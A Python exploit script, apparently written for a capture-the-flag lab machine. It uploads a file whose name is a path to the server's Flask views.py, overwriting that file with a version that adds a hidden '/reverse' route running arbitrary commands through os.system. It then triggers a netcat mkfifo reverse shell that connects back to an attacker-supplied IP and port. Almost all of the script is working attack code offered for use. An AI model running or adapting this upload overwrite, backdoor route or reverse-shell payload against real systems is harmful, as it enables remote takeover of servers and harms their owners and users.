#!/usr/bin/env python3

import requests, signal, sys, subprocess, shlex, argparse, time
from pwn import *

# testing
import pdb

# ctrl + c (function)
def signal_handler(signum, frame):
    log.failure("Interruption"); sys.exit()

# ctrl + c (event)
signal.signal(signal.SIGINT, signal_handler)

# global variables
target_url = "http://10.10.11.164:80/upcloud"
file_path_name = "/app/app/views.py" # important!

# arguments
parser = argparse.ArgumentParser(description='Reverse shell to container')
parser.add_argument('-ip', type=str, required=True, help='ip address to receive shell')
parser.add_argument('-port', type=int, required=True, help='port to receive shell' )

args = parser.parse_args()

# malicious function
# - - - - - - - - - - 
#   revshell_function = """
#                app.route('/reverse')
#                def shell():
#                    return os.system(request.args.get['cmd'])
#           """

# create malicious file
def create_file():
    try:
        open('views.py')
    except FileNotFoundError:
        with open('views.py', 'w') as file:
            file.write("""import os\nfrom app.utils import get_file_name\nfrom flask import render_template, request, send_file\nfrom app import app\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload_file(): #hacked\n\tif request.method == 'POST':\n\t\tf = request.files['file']\n\t\tfile_name = get_file_name(f.filename)\n\t\tfile_path = os.path.join(os.getcwd(), "public", "uploads", file_name)\n\t\tf.save(file_path)\n\t\treturn render_template('success.html', file_url=request.host_url + "uploads/" + file_name)\n\treturn render_template('upload.html')\n\n@app.route('/uploads/<path:path>')\ndef send_report(path):\n\tpath = get_file_name(path)\n\treturn send_file(os.path.join(os.getcwd(), "public", "uploads", path))\n\n@app.route('/reverse')\ndef shell():\n\treturn os.system(request.args.get('cmd'))"""
            )

# upload file with malicious function
def request_POST(p):
    time.sleep(2)
    p.status('Getting reverse shell...')
    create_file()
    try:
        files = { 'file' : (file_path_name, open('views.py', 'rb'), 'text/x-python') }
        r = requests.post(target_url, files=files)
    except Exception as e:
        p.failure(" {} ocurred.".format(e))
    log.info('File upload')
    return p

# get reverse shell
def get_shell(p):
    time.sleep(2)
    log.info('Listen on PORT {} to receive the shell'.format(args.port))
    input('Press enter to continue')
    try:
        log.info('Inserting payload to reverse shell')
        payload = 'http://10.10.11.164/reverse?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+{}+{}+>/tmp/f'.format(args.ip, args.port)
        subprocess.run(shlex.split('/usr/bin/curl {}'.format(payload)), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        p.failure(" {} ocurred.".format(e))
    p.success('Successful reverse shell')

if __name__ == '__main__':
    p = log.progress('Starting attack')
    get_shell(request_POST(p)) 
